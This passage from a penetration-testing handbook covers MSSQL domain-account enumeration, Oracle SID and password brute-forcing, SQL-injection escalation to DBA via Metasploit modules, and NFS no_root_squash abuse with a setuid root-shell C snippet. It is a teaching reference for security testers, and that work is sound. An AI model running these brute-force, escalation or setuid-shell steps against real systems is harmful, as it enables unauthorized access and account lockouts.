<section id="microsoft-sql-server-suser-sname-windows-domain-account-enumeration">
<h4>Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration<a class="headerlink" href="#microsoft-sql-server-suser-sname-windows-domain-account-enumeration" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/admin/mssql/mssql_enum_domain_accounts</span>
<span class="go">set rhost 10.10.xx.xx</span>
<span class="go">set password company@123</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] Attempting to connect to the database server at 10.10.xx.xx:1433 as sa...</span>
<span class="go">[+] Connected.</span>
<span class="go">[*] SQL Server Name: EXAMPLECRM1</span>
<span class="go">[*] Domain Name: EXAMPLE</span>
<span class="go">[+] Found the domain sid: 01050000000000051500000016c0ea32f450ba7443170a32</span>
<span class="go">[*] Brute forcing 10000 RIDs through the SQL Server, be patient...</span>
<span class="go">[*]  - EXAMPLE\administrator</span>
<span class="go">[*]  - EXAMPLE\Guest</span>
<span class="go">[*]  - EXAMPLE\krbtg</span>
<span class="go">[*]  - EXAMPLE\Domain Admins</span>
<span class="go">[*]  - EXAMPLE\Domain Users</span>
<span class="go">[*]  - EXAMPLE\Domain Guests</span>
<span class="go">[*]  - EXAMPLE\Domain Computers</span>
<span class="go">[*]  - EXAMPLE\Domain Controllers</span>
<span class="go">[*]  - EXAMPLE\Cert Publishers</span>
<span class="go">[*]  - EXAMPLE\Schema Admins</span>
<span class="go">[*]  - EXAMPLE\Enterprise Admins</span>
<span class="go">[*]  - EXAMPLE\Group Policy Creator Owners</span>
<span class="go">[*]  - EXAMPLE\Read-only Domain Controllers</span>
<span class="go">[*]  - EXAMPLE\RAS and IAS Servers</span>
<span class="go">[*]  - EXAMPLE\Allowed RODC Password Replication Group</span>
<span class="go">[*]  - EXAMPLE\Denied RODC Password Replication Group</span>
<span class="go">[*]  - EXAMPLE\TsInternetUser</span>
</pre></div>
</div>
<p>Other fun modules to check are</p>
</section>
<section id="microsoft-sql-server-find-and-sample-data">
<h4>Microsoft SQL Server Find and Sample Data<a class="headerlink" href="#microsoft-sql-server-find-and-sample-data" title="Link to this heading"></a></h4>
<p>This script will search through all of the non-default databases on the SQL Server for columns that match the keywords defined in the TSQL KEYWORDS option. If column names are found that match the defined keywords and data is present in the associated tables, the script will select a sample of the records from each of the affected tables. The sample size is determined by the SAMPLE_SIZE option, and results output in a CSV format.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/admin/mssql/mssql_findandsampledata</span>
</pre></div>
</div>
</section>
<section id="microsoft-sql-server-generic-query">
<h4>Microsoft SQL Server Generic Query<a class="headerlink" href="#microsoft-sql-server-generic-query" title="Link to this heading"></a></h4>
<p>Module will allow for simple SQL statements to be executed against a MSSQL/MSDE instance given the appropiate credentials.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/admin/mssql/mssql_sql</span>
</pre></div>
</div>
</section>
<section id="mssql-schema-dump">
<h4>MSSQL Schema Dump<a class="headerlink" href="#mssql-schema-dump" title="Link to this heading"></a></h4>
<p>Module attempts to extract the schema from a MSSQL Server Instance. It will disregard builtin and example DBs such as master,model,msdb, and tempdb. The module will create a note for each DB found, and store a YAML formatted output as loot for easy reading.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/mssql/mssql_schemadump</span>
</pre></div>
</div>
</section>
</section>
<section id="id54">
<h3>Other<a class="headerlink" href="#id54" title="Link to this heading"></a></h3>
<p>We can also use</p>
<section id="tsql">
<h4>tsql<a class="headerlink" href="#tsql" title="Link to this heading"></a></h4>
<p>tsql command, install it by using freetds-bin package and use it like</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">tsql -H 10.10.xx.xx -p 1433 -U sa -P company@123</span>
<span class="go">locale is &quot;en_IN&quot;</span>
<span class="go">locale charset is &quot;UTF-8&quot;</span>
<span class="go">using default charset &quot;UTF-8&quot;</span>
<span class="go">1&gt; SELECT suser_sname(owner_sid)</span>
<span class="go">2&gt; FROM sys.databases</span>
<span class="go">3&gt; go</span>

<span class="go">sa</span>
<span class="go">sa</span>
<span class="go">sa</span>
<span class="go">sa</span>
<span class="go">EXAMPLE\administrator</span>
<span class="go">EXAMPLE\administrator</span>
<span class="go">EXAMPLE\kuanxxxx</span>
<span class="gp gp-VirtualEnv">(7 rows affected)</span>
</pre></div>
</div>
<p>See examples for Scott blogs, how to execute queries.</p>
</section>
<section id="microsoft-sql-server-management">
<h4>Microsoft SQL Server Management<a class="headerlink" href="#microsoft-sql-server-management" title="Link to this heading"></a></h4>
<p>Use Microsoft SQL Server Mangement tool to connect to Remote Database.</p>
</section>
<section id="default-ms-sql-system-tables">
<h4>Default MS-SQL System Tables<a class="headerlink" href="#default-ms-sql-system-tables" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>master Database       : Records all the system-level information for an instance of SQL Server.</p></li>
<li><p>msdb Database     : Is used by SQL Server Agent for scheduling alerts and jobs.</p></li>
<li><p>model Database        : Is used as the template for all databases created on the instance of SQL Server. Modifications made to the model database, such as database size, collation, recovery model, and other database options, are applied to any databases created afterward.</p></li>
<li><p>Resource Database     : Is a read-only database that contains system objects that are included with SQL Server. System objects are physically persisted in the Resource database, but they logically appear in the sys schema of every database.</p></li>
<li><p>tempdb Database       : Is a workspace for holding temporary objects or intermediate result sets.</p></li>
</ul>
</section>
</section>
<section id="reference-hacking-sql-server-stored-procedures">
<h3>Reference - Hacking SQL Server Stored Procedures<a class="headerlink" href="#reference-hacking-sql-server-stored-procedures" title="Link to this heading"></a></h3>
<p>Scott Sutherland has written four parts of <strong>Hacking SQL Servers</strong>:  (A must-read)</p>
<section id="part-1-un-trustworthy-databases">
<h4>Part 1: (un)Trustworthy Databases<a class="headerlink" href="#part-1-un-trustworthy-databases" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/">Hacking SQL Server Stored Procedures - Part 1: (un)Trustworthy Databases</a> : how database users commonly created for web applications can be used to escalate privileges in SQL Server when database ownership is poorly configured. Corresponding Metasploit module is Microsoft SQL Server Escalate Db_Owner ‘mssql_escalate_dbowner’.</p>
</section>
<section id="part-2-user-impersonation">
<h4>Part 2: User Impersonation<a class="headerlink" href="#part-2-user-impersonation" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation&quot;">Hacking SQL Server Stored Procedures - Part 2: User Impersonation</a> : provides a lab guide and attack walk-through that can be used to gain a better understanding of how the IMPERSONATE privilege can lead to privilege escalation in SQL Server. Corresponding Metasploit module is Microsoft SQL Server Escalate EXECUTE AS ‘mssql_escalate_execute_as’.</p>
</section>
<section id="part-3-sql-injection">
<h4>Part 3: SQL Injection<a class="headerlink" href="#part-3-sql-injection" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/">Hacking SQL Server Stored Procedures - Part 3: SQL Injection</a> : This blog covers how SQL injection can be identified and exploited to escalate privileges in SQL Server stored procedures when they are configured to execute with higher privileges using the WITH EXECUTE AS clause or certificate signing.</p>
</section>
<section id="part-4-enumerating-domain-accounts">
<h4>Part 4: Enumerating Domain Accounts<a class="headerlink" href="#part-4-enumerating-domain-accounts" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/">Hacking SQL Server Procedures - Part 4: Enumerating Domain Accounts</a> : shows enumerate Active Directory domain users, groups, and computers through native SQL Server functions using logins that only have the Public server role (everyone). It also shows how to enumerate SQL Server logins using a similar technique. Corresponding module is Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration</p>
</section>
</section>
<section id="reference-other-blogs">
<h3>Reference - Other Blogs<a class="headerlink" href="#reference-other-blogs" title="Link to this heading"></a></h3>
<section id="mssql-mitm">
<h4>MSSQL-MITM<a class="headerlink" href="#mssql-mitm" title="Link to this heading"></a></h4>
<p>Rick Osgood has written a blog <a class="reference external" href="https://blog.anitian.com/hacking-microsoft-sql-server-without-a-password/">Hacking Microsoft SQL Server Without a Password</a> on doing a man-in-the-middle-attack between the SQL-Server and the user where he changed the select statement by using ettercap to add a new user in the mysql server.</p>
</section>
<section id="others">
<h4>Others<a class="headerlink" href="#others" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p><a class="reference external" href="https://blog.netspi.com/sql-server-local-authorization-bypass/">SQL Server Local Authorization Bypass</a></p></li>
<li><p><a class="reference external" href="https://blog.netspi.com/sql-server-local-authorization-bypass-msf-modules/">SQL Server Local Authorization Bypass MSF Modules</a></p></li>
<li><p><a class="reference external" href="https://blog.netspi.com/when-databases-attack-entry-points/">When Databases Attack: Entry Points</a></p></li>
<li><p><a class="reference external" href="https://blog.netspi.com/when-databases-attack-hacking-with-the-osql-utility/">When Databases Attack: Hacking with the OSQL Utility</a></p></li>
<li><p><a class="reference external" href="https://blog.netspi.com/when-databases-attack-sql-server-express-privilege-inheritance-issue/">When Databases Attack: SQL Server Express Privilege Inheritance Issue</a></p></li>
<li><p><a class="reference external" href="https://blog.netspi.com/when-databases-attack-finding-data-on-sql-servers/">When Databases Attack - Finding Data on SQL Servers</a></p></li>
<li><p><a class="reference external" href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/">Maintaining Persistence via SQL Server - Part 1: Startup Stored Procedures</a></p></li>
</ul>
</section>
</section>
</section>
<section id="port-1521-oracle">
<span id="oracle-port-1521"></span><h2>Port 1521 - Oracle<a class="headerlink" href="#port-1521-oracle" title="Link to this heading"></a></h2>
<p>After setting up oracle with metasploit here <a class="reference external" href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux">How to get Oracle Support working with Kali Linux</a> We will directly follow the procedure presented by Chris Gates <a class="reference external" href="http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf">BHUSA09-Gates-OracleMetasploit-Slides</a></p>
<section id="oracle-attack-methodology">
<h3>Oracle Attack Methodology<a class="headerlink" href="#oracle-attack-methodology" title="Link to this heading"></a></h3>
<p>We need 4 things to connect to an Oracle DB.</p>
<ul class="simple">
<li><p>IP.</p></li>
<li><p>Port.</p></li>
<li><p>Service Identifier (SID).</p></li>
<li><p>Username/ Password.</p></li>
</ul>
<section id="locate-oracle-systems">
<h4>Locate Oracle Systems<a class="headerlink" href="#locate-oracle-systems" title="Link to this heading"></a></h4>
<p>Nmap would probably be the best tool to find the oracle instances.</p>
</section>
<section id="determine-oracle-version">
<h4>Determine Oracle Version<a class="headerlink" href="#determine-oracle-version" title="Link to this heading"></a></h4>
<p>Metasploit has</p>
<ul class="simple">
<li><p><strong>Oracle TNS Listener Service Version Query</strong></p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/oracle/tnslsnr_version</span>
<span class="go">services -p 1521 -u -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 10.10.xx.xx:1521 Oracle - Version: 64-bit Windows: Version 11.1.0.7.0 - Production</span>
<span class="go">[-] 10.10.xx.xx:1521 Oracle - Version: Unknown - Error code 1189 - The listener could not authenticate the user</span>
<span class="go">[-] 10.10.xx.xx:1521 Oracle - Version: Unknown</span>
<span class="go">[*] Scanned  8 of 12 hosts (66% complete)</span>
<span class="go">[+] 10.10.xx.xx:1521 Oracle - Version: 32-bit Windows: Version 10.2.0.1.0 - Production</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="determine-oracle-sid">
<h4>Determine Oracle SID<a class="headerlink" href="#determine-oracle-sid" title="Link to this heading"></a></h4>
<p>Oracle Service Identifier: By querying the TNS Listener directly, brute force for default SID’s or query other components that may contain it.</p>
<p><strong>Metasploit</strong> has</p>
<ul class="simple">
<li><p><strong>Oracle TNS Listener SID Enumeration</strong>: This module simply queries the TNS listner for the Oracle SID. With Oracle 9.2.0.8 and above the listener will be protected and the SID will have to be bruteforced or guessed.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/oracle/sid_enum</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p><strong>Oracle TNS Listener SID Bruteforce</strong>:   This module queries the TNS listner for a valid Oracle database instance name (also known as a SID). Any response other than a “reject” will be considered a success. If a specific SID is provided, that SID will be attempted. Otherwise, SIDs read from the named file will be attempted in sequence instead.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/oracle/sid_brute</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.140.200.163:1521   -  - Oracle - Checking &#39;SA0&#39;...</span>
<span class="go">[*] 10.140.200.163:1521   -  - Oracle - Refused &#39;SA0&#39;</span>
<span class="go">[*] 10.140.200.163:1521   -  - Oracle - Checking &#39;PLSEXTPROC&#39;...</span>
<span class="go">[+] 10.140.200.163:1521   - 10.140.200.163:1521 Oracle - &#39;PLSEXTPROC&#39; is valid</span>
</pre></div>
</div>
</div></blockquote>
<p><strong>Nmap</strong> has:</p>
<ul class="simple">
<li><p><a class="reference external" href="https://nmap.org/nsedoc/scripts/oracle-sid-brute.html">Oracle-sid-brute.nse</a> : Guesses Oracle instance/SID names against the TNS-listener.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script=oracle-sid-brute --script-args=oraclesids=/path/to/sidfile -p 1521-1560 &lt;host&gt;</span>
<span class="go">nmap --script=oracle-sid-brute -p 1521-1560 &lt;host&gt;</span>
</pre></div>
</div>
</div></blockquote>
<p>A good white paper on guessing the Service Identifier is <a class="reference external" href="http://www.dsecrg.com/files/pub/pdf/Different_ways_to_guess_Oracle_database_SID_(eng).pdf">Different ways to guess Oracle database SID</a></p>
</section>
<section id="guess-bruteforce-user-pass">
<h4>Guess/Bruteforce USER/PASS<a class="headerlink" href="#guess-bruteforce-user-pass" title="Link to this heading"></a></h4>
<p>Once we know the service identifier, we need to find out a valid username and password..</p>
<p><strong>Metasploit</strong> has</p>
<ul class="simple">
<li><p><strong>Oracle RDBMS Login Utility</strong>: It actually runs nmap in the background, requires RHOSTS, RPORTS, SID to test the default usernames and passwords.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/oracle/oracle_login</span>
</pre></div>
</div>
</div></blockquote>
<p><strong>Nmap</strong> has</p>
<ul class="simple">
<li><p><a class="reference external" href="https://nmap.org/nsedoc/scripts/oracle-brute.html">Oracle-brute.nse</a> Performs brute force password auditing against Oracle servers. Running it in default mode it performs an audit against a list of common Oracle usernames and passwords. The mode can be changed by supplying the argument oracle-brute.nodefault at which point the script will use the username- and password- lists supplied with Nmap. The script makes no attempt to discover the amount of guesses that can be made before locking an account. Running this script may therefor result in a large number of accounts being locked out on the database server.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL &lt;host&gt;</span>
</pre></div>
</div>
</div></blockquote>
<ul>
<li><p><a class="reference external" href="https://nmap.org/nsedoc/scripts/oracle-brute-stealth.html">oracle-brute-stealth.nse</a> : Exploits the CVE-2012-3137 vulnerability, a weakness in Oracle’s O5LOGIN authentication scheme. The vulnerability exists in Oracle 11g R1/R2 and allows linking the session key to a password hash. When initiating an authentication attempt as a valid user the server will respond with a session key and salt. Once received the script will disconnect the connection thereby not recording the login attempt. The session key and salt can then be used to brute force the users password.</p>
<p>CVE-2012-3137: The authentication protocol in Oracle Database Server 10.2.0.3, 10.2.0.4, 10.2.0.5, 11.1.0.7, 11.2.0.2, and 11.2.0.3 allows remote attackers to obtain the session key and salt for arbitrary users, which leaks information about the cryptographic hash and makes it easier to conduct brute force password guessing attacks, aka “stealth password cracking vulnerability.</p>
</li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL &lt;host&gt;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p><a class="reference external" href="https://nmap.org/nsedoc/scripts/oracle-enum-users.html">Oracle-enum-users</a> : Attempts to enumerate valid Oracle user names against unpatched Oracle 11g servers (this bug was fixed in Oracle’s October 2009 Critical Patch Update).</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt -p 1521-1560 &lt;host&gt;</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="privilege-escalation-via-sql-injection">
<h4>Privilege Escalation via SQL Injection<a class="headerlink" href="#privilege-escalation-via-sql-injection" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>lt_findricset.rb</p></li>
<li><p>lt_findricset_cursor.rb: Oracle DB SQL Injection via SYS.LT.FINDRICSET Evil Cursor Method:   This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the SYS.LT.FINDRICSET package via Evil Cursor technique. Tested on oracle 10.1.0.3.0 – should work on thru 10.1.0.5.0 and supposedly on 11g. Fixed with Oracle Critical Patch update October 2007.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/sqli/oracle/lt_findricset_cursor</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>dbms_metadata_open.rb: Oracle DB SQL Injection via SYS.DBMS_METADATA.OPEN:   This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the SYS.DBMS_METADATA.OPEN package/function.</p></li>
<li><p>dbms_cdc_ipublish: Oracle DB SQL Injection via SYS.DBMS_CDC_IPUBLISH.ALTER_HOTLOG_INTERNAL_CSOURCE:   The module exploits an sql injection flaw in the ALTER_HOTLOG_INTERNAL_CSOURCE procedure of the PL/SQL package</p></li>
<li><p>DBMS_CDC_IPUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege. Affected versions:  Oracle Database Server versions 10gR1, 10gR2 and 11gR1. Fixed with October 2008 CPU.</p></li>
<li><p>dbms_cdc_publish: Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.ALTER_AUTOLOG_CHANGE_SOURCE: The module exploits an sql injection flaw in the ALTER_AUTOLOG_CHANGE_SOURCE procedure of the PL/SQL package</p></li>
<li><p>DBMS_CDC_PUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege. Affected versions: Oracle Database Server versions 10gR1, 10gR2 and 11gR1. Fixed with October 2008 CPU.</p></li>
<li><p>dbms_cdc_publish2: Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE: The module exploits an sql injection flaw in the DROP_CHANGE_SOURCE procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege.</p></li>
<li><p>dbms_cdc_publish3: Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.CREATE_CHANGE_SET: The module exploits an sql injection flaw in the CREATE_CHANGE_SET procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege.</p></li>
<li><p>dbms_cdc_subscribe_activate_subscription: Oracle DB SQL Injection via SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION: This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION package/function. This vulnerability affects to Oracle Database Server 9i up to 9.2.0.5 and 10g up to 10.1.0.4.</p></li>
<li><p>lt_compressworkspace.rb: Oracle DB SQL Injection via SYS.LT.COMPRESSWORKSPACE:   This module exploits an sql injection flaw in the COMPRESSWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability.</p></li>
<li><p>lt_mergeworkspace.rb: Oracle DB SQL Injection via SYS.LT.MERGEWORKSPACE:   This module exploits an sql injection flaw in the MERGEWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability.</p></li>
<li><p>lt_removeworkspace.rb: Oracle DB SQL Injection via SYS.LT.REMOVEWORKSPACE:   This module exploits an sql injection flaw in the REMOVEWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability.</p></li>
<li><p>lt_rollbackworkspace.rb: Oracle DB SQL Injection via SYS.LT.ROLLBACKWORKSPACE:   This module exploits an sql injection flaw in the ROLLBACKWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability.</p></li>
</ul>
</section>
<section id="manipulate-data-post-exploitation">
<h4>Manipulate Data/Post Exploitation<a class="headerlink" href="#manipulate-data-post-exploitation" title="Link to this heading"></a></h4>
<p>The above privilege escalation exploits will provide us DBA access, from where we can access the data. We can use</p>
<ul class="simple">
<li><p>Metasploit oracle_sql: Oracle SQL Generic Query: This module allows for simple SQL statements to be executed against a Oracle instance given the appropriate credentials and sid.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/admin/oracle/oracle_sql</span>
</pre></div>
</div>
<p>or you can directly connect to the database using</p>
</div></blockquote>
<ul class="simple">
<li><p>SQLPlus</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sqlplus username/password@host:port/service</span>
</pre></div>
</div>
<p>or use tnsnames.ora file to connect to the database. For that edit it and add a new entry: This file normally resides in the $ORACLE HOMENETWORKADMIN directory.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">myDb  =</span>
<span class="go"> (DESCRIPTION =</span>
<span class="go">   (ADDRESS_LIST =</span>
<span class="go">     (ADDRESS = (PROTOCOL = TCP)(Host = c)(Port =a))</span>
<span class="go">  )</span>
<span class="go"> (CONNECT_DATA =</span>
<span class="go">   (SERVICE_NAME =b)</span>
<span class="go"> )</span>
<span class="go">)</span>
</pre></div>
</div>
<p>and then you could connect to the db:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sqlplus x/y@myDb</span>
</pre></div>
</div>
<p>However, there’s more to Post Exploitation which are OS Shells. There are multiple methods for running OS commands via oracle libraries.</p>
</div></blockquote>
<ul>
<li><p>Via Java:</p>
<p>There’s a metasploit</p>
</li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>win32exec: Oracle Java execCommand (Win32):   This module will create a java class which enables the execution of OS commands. First, we need to grant the user privileges of JAVASYSPRIVS using oracle_sql module</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/admin/oracle/post_exploitation/win32exec</span>
</pre></div>
</div>
<p>This can also be done by executing SQL Scripts provided by oracle. For more information refer <a class="reference external" href="http://www.oracle.com/technetwork/database/enterprise-edition/calling-shell-commands-from-plsql-1-1-129519.pdf">Executing operating system commands from PL/ SQL</a></p>
</div></blockquote>
<ul class="simple">
<li><p>Extproc backdoors</p></li>
<li><p>DBMS_Scheduler</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Run custom pl/sql or java</span>
</pre></div>
</div>
</div></blockquote>
</div></blockquote>
</section>
<section id="cover-tracks">
<h4>Cover Tracks<a class="headerlink" href="#cover-tracks" title="Link to this heading"></a></h4>
<p><strong>Metasploit</strong> has</p>
<ul class="simple">
<li><p>We can use <strong>Oracle TNS Listener Checker</strong> which module checks the server for vulnerabilities like TNS Poison.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/oracle/tnspoison_checker</span>
<span class="go">services -p 1521 -u -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 10.10.xx.xx:1521 is vulnerable</span>
<span class="go">[+] 10.10.xx.xx:1521 is vulnerable</span>
<span class="go">[*] Scanned  2 of 12 hosts (16% complete)</span>
<span class="go">[-] 10.10.xx.xx:1521 is not vulnerable</span>
</pre></div>
</div>
</div></blockquote>
<p>Some SQL statements which could be executed after SQL Plus connection:</p>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">1. select * from global_name</span>
</pre></div>
</div>
</div></blockquote>
<p>A good blog to secure oracle is <a class="reference external" href="http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html">Top 10 Oracle Steps to a Secure Oracle Database Server</a></p>
</section>
</section>
</section>
<section id="port-2049-nfs">
<span id="nfs-port-2049"></span><h2>Port 2049 - NFS<a class="headerlink" href="#port-2049-nfs" title="Link to this heading"></a></h2>
<p>If the port number 2049 is open</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$ </span>nmap<span class="w"> </span>-A<span class="w"> </span>-T4<span class="w"> </span>-sT<span class="w"> </span>-p1-65535<span class="w"> </span>someexample.com
<span class="go">2049/tcp  open  nfs         2-4 (RPC #100003)</span>
</pre></div>
</div>
<p>We can scan the available exports</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$ </span>showmount<span class="w"> </span>-e<span class="w"> </span>someexample.com
<span class="go">Export list for someexample.com:</span>
<span class="go">/backup *</span>
</pre></div>
</div>
<p>Now, let’s try to mount /backup and to get the content</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$ </span>mkdir<span class="w"> </span>backup
<span class="gp">$ </span>mount<span class="w"> </span>-o<span class="w"> </span>ro,noexec<span class="w"> </span>someexample.com:/backup<span class="w"> </span>backup
<span class="gp">$ </span>ls<span class="w"> </span>backup
<span class="go">backup.tar.bz2.zip</span>
</pre></div>
</div>
<p>This is implemented by /etc/exports</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">www-data@example2.com:/$ </span>cat<span class="w"> </span>/etc/exports
<span class="go">cat /etc/exports</span>
<span class="gp"># </span>/etc/exports:<span class="w"> </span>the<span class="w"> </span>access<span class="w"> </span>control<span class="w"> </span>list<span class="w"> </span><span class="k">for</span><span class="w"> </span>filesystems<span class="w"> </span>which<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>exported
<span class="gp">#              </span>to<span class="w"> </span>NFS<span class="w"> </span>clients.<span class="w">  </span>See<span class="w"> </span>exports<span class="o">(</span><span class="m">5</span><span class="o">)</span>.
<span class="gp">#</span>
<span class="gp"># </span>Example<span class="w"> </span><span class="k">for</span><span class="w"> </span>NFSv2<span class="w"> </span>and<span class="w"> </span>NFSv3:
<span class="gp"># </span>/srv/homes<span class="w">       </span>hostname1<span class="o">(</span>rw,sync,no_subtree_check<span class="o">)</span><span class="w"> </span>hostname2<span class="o">(</span>ro,sync,no_subtree_check<span class="o">)</span>
<span class="gp">#</span>
<span class="gp"># </span>Example<span class="w"> </span><span class="k">for</span><span class="w"> </span>NFSv4:
<span class="gp"># </span>/srv/nfs4<span class="w">        </span>gss/krb5i<span class="o">(</span>rw,sync,fsid<span class="o">=</span><span class="m">0</span>,crossmnt,no_subtree_check<span class="o">)</span>
<span class="gp"># </span>/srv/nfs4/homes<span class="w">  </span>gss/krb5i<span class="o">(</span>rw,sync,no_subtree_check<span class="o">)</span>
<span class="gp">#</span>
<span class="go">/tmp *(rw,no_root_squash)</span>
<span class="go">/var/nfsshare *(rw,sync,root_squash,no_all_squash)</span>
<span class="go">/opt *(rw,sync,root_squash,no_all_squash)</span>
</pre></div>
</div>
<p><strong>Do Not Use the no_root_squash Option</strong></p>
<p>By default, NFS shares change the root user to the nfsnobody user, an unprivileged user account. In this way, all root-created files are owned by nfsnobody, which prevents uploading of programs with the setuid bit set. If no_root_squash is used, remote root users are able to change any file on the shared file system and leave trojaned applications for other users to inadvertently execute.</p>
<p><strong>Do Not Use the no_all_squash Option</strong></p>
<p>The no_all_squash parameter is similar to no_root_squash option but applies to non-root users. Imagine, you have a shell as nobody user; checked /etc/exports file; no_all_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.</p>
<p><strong>Note</strong> This is very dangerous if a) found on a linux box and b) you are unprivileged user on that linux box. Above we have mounted as read-only. However, we can mount as rw and copy a setuid program. Once suid file is uploaded, we can execute it and become that user.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">int main(void) {</span>
<span class="go">setgid(0); setuid(0);</span>
<span class="go">execl(“/bin/sh”,”sh”,0); }</span>
</pre></div>
</div>
<p>Compile it based on the architecture, give it setuid and executable permissions as root (Remember, we mounted as root)</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">chown root.root ./pwnme</span>
<span class="go">chmod u+s ./pwnme</span>
</pre></div>
</div>
